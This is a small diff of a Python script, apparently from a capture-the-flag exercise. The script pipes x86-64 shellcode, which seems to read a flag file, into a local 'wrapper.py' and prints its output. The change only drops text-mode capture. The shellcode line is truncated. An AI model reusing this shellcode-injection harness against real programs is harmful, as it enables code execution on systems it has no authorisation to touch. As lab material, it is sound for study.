@@ -4,7 +4,7 @@ shellcode = b"\x48\xB8\x67\x65\x2F\x66\x6C\x61\x67\x00\x50\x48\xB8\x2F\x63\x68\x
 result = subprocess.run(['python3', 'wrapper.py'], 
                         input=shellcode,
                         env={'PYTHONUNBUFFERED': '1'},
-                        capture_output=True, text=True)
+                        capture_output=True)
 print("Return code:", result.returncode)
 print("Output:", result.stdout)
 print("Errors:", result.stderr)
